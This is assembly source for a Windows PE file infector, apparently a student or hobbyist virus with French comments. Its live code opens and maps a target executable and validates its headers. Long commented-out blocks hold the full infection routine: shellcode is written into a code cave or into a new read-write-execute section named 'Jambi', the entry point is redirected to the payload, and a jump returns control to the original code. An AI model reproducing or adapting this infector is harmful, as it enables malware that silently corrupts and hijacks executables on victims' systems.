.code
bsn:
db 13, 10, 0
infect:						; eax == cFilename
	mov	ebx, very_last
	mov	ecx, very_first
						; ecx contiens beg
	sub	ebx, ecx			; ebx contiens strlen(sh)

	mov	[ebp  - 52], ecx
	mov	[ebp  - 56], ebx
	add	ebx, 4
	mov	[ebp - 60], ebx			; TOTAL size = shellcode size + jump size
	mov	[ebp - 64], eax			; cFilename

;; 	;;;;; CreateFile seem fucking up [ebp + 8] after loop 1
	;; push	[ebp + 8] ;;;;; Copying [ebp + 8]
	;; call	dword ptr [ebp - 292]
	;; cmp	eax, NULL
;; 	je	_error0

;; 	push	eax ;;;;; Saving [ebp + 8]

	;; CreateFile
	push	0
	push	0
	push	OPEN_EXISTING
	push	NULL
	push	FILE_SHARE_READ or FILE_SHARE_WRITE
	push	GENERIC_READ or GENERIC_WRITE
	push	[ebp - 64]
	call	dword ptr [ebp - 228]

	cmp	eax, INVALID_HANDLE_VALUE
	je	end_infect

	mov	[ebp - 2800], eax			;; handle (creatfile)

	; CreateFileMapping
	push	NULL
	push	0
	push	0
	push	PAGE_READWRITE
	push	NULL
	push	eax
	call	dword ptr [ebp - 232]

	cmp	eax, NULL
	je	end_infect

	mov	[ebp - 2804], eax			; handle (mapping)

	; MapViewOfFile
	push	0
	push	0
	push	0
	push	FILE_MAP_ALL_ACCESS
	push	eax
	call	dword ptr [ebp - 252]

	cmp	eax, NULL
	je	end_infect

	mov	[ebp - 2808], eax			; handle (view of file)

	mov	edx, [eax]

	;; acces au champs e_magic
	nop
	cmp	dx, IMAGE_DOS_SIGNATURE
	jne	end_infect


	; infosExecutable + infosExecutable->e_lfanew
	add	eax, 60

	; recupere la valeur du long (e_lfanew)
	mov	edx, [eax]

	; recupere l'addresse du PIMAGE_DOS_HEADER
	sub	eax, 60

	; ajoute l'offset pour recuperer l'addresse du PIMAGE_NT_HEADERS
	add	eax, edx

	mov	edx, [eax]

	; acces au champs Signature
	nop
	cmp	edx, IMAGE_NT_SIGNATURE
	jne	end_infect


	; saving PIMAGE_NT_HEADERS
 	mov	[ebp - 16], eax

	; sizeof IMAGE_NT_HEADERS <=> 248
	; sizeof IMAGE_SECTION_HEADER <=> 40
	add	eax, 6

	; accessing number of sections
	xor	ecx, ecx
	mov	cx, [eax]

	mov	edx, ecx ; saving number of sections for calling isHealthy

	sub	eax, 6

	; number of sections * IMAGE_SECTION_HEADER
	imul	ecx, 40
	add	ecx, eax

	add	ecx, 248

	; PIMAGE_SECTION_HEADER
	mov	[ebp - 20], ecx

	nop
;; peluche:
;;  	push	[ebp - 64]
;;  	call	crt_printf
;; 	jmp	end_infect

	;~~~~~~~~~~~~~~~~~~~~
	; Check if the binary is healthy
	;~~~~~~~~~~~~~~~~~~~~
 	jmp 	isHealthy
end_isHealthy:

	;; or	eax, eax
	;; jne	checking_space

;; 	mov	eax, 1 ; infection failed.

;; 	leave
;; 	ret	4

;; 	;~~~~~~~~~~~~~~~~~~~~~~~~~~
;; 	; checking space
;; 	;~~~~~~~~~~~~~~~~~~~~~~~~~~

checking_space:
;; 	mov	edx, [ebp - 20]

;; 	push	40
;; 	push	edx
;; 	call	is_zero_long

;; 	or	eax, eax
;; 	je 	proceed_to_infection

;; 	mov	ebx, [ebp - 12]

;; 	mov	edx, [ebp - 16]
;; 	add	edx, 52 ; offset to ImageBase
;; 	mov	eax, [edx]
;; 	sub	edx, 12 ; offset to AddressOfEntryPoint
;; 	add	eax, [edx]
;; 	mov	[ebp - 24], eax ; stocking REAL AddressOfEntryPoint

;; 	; getting max addr to paste shellcode (staying in .text)
;; 	mov	eax, [ebp - 16]
;; 	add	eax, 248 ; Goto first section header
;; 	add	eax, 40 ; Goto next section header
;; 	mov	eax, [eax + 20] ; PointerToRawData value
;; 	add	eax, [ebp - 12] ; addr of MZ
;; 	sub	eax, 122
;; 	mov	[ebp - 48], eax

;; 	check_zero_loop:
;; 	inc	ebx

;; 	; on verif que cest pas deja infecte
;; 	;lal
;; 	mov	eax, [ebp  - 56]
;; 	push	eax    ; la taille du pload sans le jump
;; 	push	[ebp - 52]
;; 	push	ebx
;; 	call	dword ptr [ebp - 272]

;; 	or	eax, eax
;; 	je	end_injection

;; 	; sinon on check si ya assez de place pour se caler.
;; 	mov	eax, [ebp  - 60]
;; 	add	eax, 6
;; 	push	eax
;; 	push	ebx
;; 	call	is_zero_long

;; 	or	eax, eax
;; 	je	proceed_to_injection

;; 	cmp	ebx, [ebp - 48]
;; 	jb	check_zero_loop ; si on est encore dans TEXT !!!

;; 	jmp	end_injection

;; 	proceed_to_injection:
;; 	add	ebx, 5    ; pour pas ecraser un null terminator
;; 	mov	eax, [ebp  - 56]

;; 	push	eax
;; 	push	[ebp - 52]
;; 	push	ebx
;; 	call	dword ptr [ebp - 276]; copy shellcode

;; 	; on calcule = ancien ep - present ep - (taille shellcode + jmp + addr)
;; 	mov 	eax, ebp
;; 	sub 	eax, 24
;; 	mov	ecx, ebx
;; 	sub	ecx, [ebp - 12]
;; 	mov	edx, [ebp - 16]
;; 	add	edx, 52 ; offset to ImageBase
;; 	add	ecx, [edx]
;; 	push	eax ; point to ebp -24
;; 	mov	eax, [eax]
;; 	sub	eax, ecx
;; 	sub	eax, [ebp - 60]		; taille shellcode + jump + adresse du jump
;; 	mov	[ebp - 24], eax
;; 	pop	eax ; point to ebp - 24

;; 	; on le concatene a notre shellcode
;; 	add	ebx, [ebp - 56]
;; 	push	4
;; 	push 	eax ; adresse de l'offset pour le jump to roiginal entry point
;; 	push	ebx
;; 	call	dword ptr [ebp - 276]; copy shellcode

;; 	sub	ebx, [ebp - 56]

;; 	; On set l'entry point
;; 	mov	edx, [ebp - 16]
;; 	add	edx, 40 ; offset to AddressOfEntryPoint
;; 	sub	ebx, [ebp - 12]
;; 	mov	[edx], ebx

;; 	end_injection:
;; 	push	[ebp - 12]
;; 	call	dword ptr [ebp - 260]

;; 	push	[ebp - 8]
;; 	call	dword ptr [ebp - 296]
;; 	cmp	eax, 0
;; 	je	_error9

;; 	push	[ebp - 4]
;; 	call	dword ptr [ebp - 296]
;; 	cmp	eax, 0
;; 	je	_error9

;; 	leave
;; 	ret 	4

;; 	proceed_to_infection:
;; 	;~~~~~~~~~~~~~~~~~~~
;; 	; increment number of sections
;; 	;~~~~~~~~~~~~~~~~~~~
;; 	mov	edx, [ebp - 16]
;; 	add	edx, 6

;; 	xor	ecx, ecx
;; 	mov	cx, [edx]
;; 	inc	cx
;; 	mov	[edx], ecx

;; 	;~~~~~~~~~~~~~~~~~~~~~~~~~~
;; 	; Increasing OptionalHeader.SizeOfImage
;; 	; payload_size is the new section size
;; 	;~~~~~~~~~~~~~~~~~~~~~~~~~~
;; 	mov	edx, [ebp - 16]
;; 	add	edx, 80

;; 	mov	ecx, [edx]

;; 	mov	eax, [ebp  - 60]
;; 	add	cx, ax
;; 	mov	[edx], ecx

;; 	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;; 	; Retrieving	AddressOfEntryPoint
;; 	; 					SectionAlignment
;; 	; 					FileAlignment
;; 	; from PIMAGE_NT_HEADERS
;; 	;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
;; 	mov	ebx, [ebp - 16]
;; 	add	ebx, 52 ; offset to ImageBase
;; 	mov	edx, [ebx]

;; 	sub	ebx, 12 ; offset to AddressOfEntryPoint
;; 	mov	ecx, [ebx]

;; 	add	edx, ecx
;; 	mov	[ebp - 24], edx ; stocking REAL AddressOfEntryPoint

;; 	add	ebx, 16 ; offset to SectionAlignment
;; 	mov	edx, [ebx]
;; 	mov	[ebp - 28], edx

;; 	add	ebx, 4 ; offset to FileAlignment
;; 	mov	edx, [ebx]
;; 	mov	[ebp - 32], edx

;; 	;~~~~~~~~~~~~~~~~~~~~~~~~~~
;; 	; Creating new section
;; 	;~~~~~~~~~~~~~~~~~~~~~~~~~~
;; 	mov	edx, [ebp - 20]

;; 	push	offset sectionName
;; 	push	edx
;; 	call 	dword ptr [ebp - 284]

;; 	; Setting our section datas
;; 	mov	ebx, [ebp - 20]
;; 	; Setting Misc.VirtualSize -> AligneSur(sectionAlignment,tailleSection);
;; 	;push payload_size ; shell code size + dword jump to old entry point

;; 	mov	eax, [ebp  - 60]
;; 	push	eax
;; 	push	[ebp - 28]
;; 	call	alignment

;; 	add	ebx, 8 ; Goto Misc.VirtualSize
;; 	mov	[ebx], eax

;; 	; Setting VirtualAddress -> AligneSur(sectionAlignment,(infosSection->VirtualAddress + infosSection->Misc.VirtualSize));
;; 	mov	ebx, [ebp - 20]
;; 	sub	ebx, 40 ; jumping to Jambi's previous section

;; 	add	ebx, 8 ; accessing Misc.VirtualSize

;; 	mov	eax, [ebx]
;; 	add	ebx, 4 ; accessing VirtualAddress
;; 	add	eax, [ebx]

;; 	push	eax
;; 	push	[ebp - 28]
;; 	call	alignment

;; 	add	ebx, 40 ; jumping to Jambi section
;; 	mov	[ebx], eax ; setting jambi virtual address

;; 	; Setting  SizeOfRawData = AligneSur(fileAlignment,tailleSection);
;; 	add	ebx , 4

;; 	mov	eax, [ebp  - 60]
;; 	push	eax
;; 	push	[ebp - 32]
;; 	call	alignment

;; 	mov	[ebx], eax

;; 	; Setting  PointerToRawData -> AligneSur(fileAlignment,(infosSection->SizeOfRawData + infosSection->PointerToRawData));
;; 	sub	ebx, 40
;; 	mov	edx, [ebx]

;; 	add	ebx , 4
;; 	add	edx, [ebx]

;; 	push	edx
;; 	push 	[ebp - 32]
;; 	call	alignment

;; 	add	ebx, 40
;; 	mov	[ebx], eax


;; 	xor	eax, eax
;; 	;PointerToRelocations = 0;
;; 	add	ebx, 4
;; 	mov	[ebx], eax
;; 	    ;PointerToLinenumbers = 0;
;; 	add	ebx, 4
;; 	mov	[ebx], eax
;; 	    ;NumberOfRelocations = 0;
;; 	add	ebx, 4
;; 	mov	[ebx], eax
;; 	    ;NumberOfLinenumbers = 0;
;; 	add	ebx, 2
;; 	mov	[ebx], eax
;; 	; Caracteritics
;; 	add	ebx, 2
;; 	mov	edx, IMAGE_SCN_MEM_READ
;; 	add	edx, IMAGE_SCN_MEM_WRITE
;; 	add	edx, IMAGE_SCN_MEM_EXECUTE
;; 	mov	[ebx], edx

;; 	;~~~~~~~~~~~~~~~~~~~~~~~~~~
;; 	; Setting new entry point
;; 	;~~~~~~~~~~~~~~~~~~~~~~~~~~
;; 	mov	ebx, [ebp - 16]
;; 	add	ebx, 40 ; offset to AddressOfEntryPoint

;; 	mov	edx, [ebp - 20]
;; 	add	edx, 12

;; 	mov	eax, [edx]
;; 	mov	[ebx], eax

;; 	; saving PointerToRawData from our section
;; 	mov	edx, [ebp - 20]
;; 	add	edx, 20
;; 	push	[edx]
;; 	pop	[ebp - 40]

;; 	; calcul de l'addresse pour copier l'addresse du jump
;; 	mov	edx, [ebp - 20] ; PIMAGE_SECTION_HEADER
;; 	add	edx, 12
;; 	mov	edx, [edx]

;; 	mov	eax, [ebp - 16]
;; 	add	eax, 52 ; offset to ImageBase
;; 	mov	eax, [eax]
;; 	add	edx, eax

;; 	mov	eax, [ebp  - 60]
;; 	add	edx, eax

;; 	mov	eax, [ebp - 24]

;; 	sub	eax, edx
;; 	mov	[ebp - 44], eax

;; 	; Clean up all
;; 	push	[ebp - 12]
;; 	call	dword ptr [ebp - 260]

;; 	push	[ebp - 8]
;; 	call	dword ptr [ebp - 296]
;; 	cmp	eax, 0
;; 	je	_error9

;; 	push	[ebp - 4]
;; 	call	dword ptr [ebp - 296]
;; 	cmp	eax, 0
;; 	je	_error10

;; 	;-------------------------------------------------------
;; 	; CrateFile
;; 	xor 	ebx, ebx

;; 	push	ebx ; ebx is null
;; 	push	FILE_ATTRIBUTE_NORMAL
;; 	push	OPEN_ALWAYS
;; 	push	ebx ; ebx is null
;; 	push	FILE_SHARE_WRITE
;; 	push 	GENERIC_WRITE
;; 	push 	[ebp + 8]
;; 	call	dword ptr [ebp - 228]

;; 	cmp	eax, INVALID_HANDLE_VALUE
;; 	je	_error6

;; 	mov	[ebp - 36], eax

;; 	; SetFilePointer(fp,pointerToRaw,0,FILE_BEGIN);
;; 	push	FILE_BEGIN
;; 	push	ebx
;; 	push	[ebp - 40]
;; 	push	eax
;; 	call	dword ptr [ebp - 256]

;; 	cmp	eax, INVALID_SET_FILE_POINTER
;; 	je	_error7
;; 	cmp	eax, ebx ; ebx is null
;; 	jb	_error7

;; 	mov	edx, ebp
;; 	sub	edx, 8

;; 	; WriteFile shellcode
;; 	push	ebx
;; 	push	edx	; [ebp - 8]
;; 	mov	ecx, [ebp  - 56] ; shellcode size - jump_size -> sizeof(dword)
;; 	push	ecx
;; 	push	[ebp - 52]
;; 	push	[ebp - 36]
;; 	call	dword ptr [ebp - 264]

;; 	cmp	eax, ebx ; ebx is null
;; 	jb	_error8


;; 	mov	edx, ebp
;; 	sub	edx, 8 ; dummy

;; 	mov	eax, ebp
;; 	sub	eax, 44

;; 	; WriteFile entrypoint a la suite du shellcode
;; 	push	ebx
;; 	push	edx
;; 	push	4
;; 	push	eax
;; 	push	[ebp - 36]
;; 	call	dword ptr [ebp - 264]

;; 	cmp	eax, ebx ; ebx is null
;; 	jb	_error8

;; 	mov	ebx, [ebp  - 60]
;; 	push	ebx
;; 	push	[ebp - 32]
;; 	call	alignment

;; 	mov	edx, ebx
;; 	mov	ebx, eax
;; 	sub	ebx, edx

;; 	; Filling with nop
;; 	;on complete par des nop pour avoir la meme taille que ce que l'on a mis dans l'entete d'information.
;; 	finalize:
;; 	mov	edx, ebp
;; 	sub	edx, 8 ; dummy

;; 	push	0
;; 	push	edx
;; 	push	1
;; 	push	offset binary_noop
;; 	push	[ebp - 36]
;; 	call	dword ptr [ebp - 264]

;; 	cmp	eax, 0 ; ebx is null
;; 	jb	_error8

;; 	dec	ebx
;; 	or	ebx, ebx
;; 	jne	finalize

;; 	push	[ebp - 36]
;; 	call	dword ptr [ebp - 296]

;; 	mov	eax, 42




	jmp end_infect
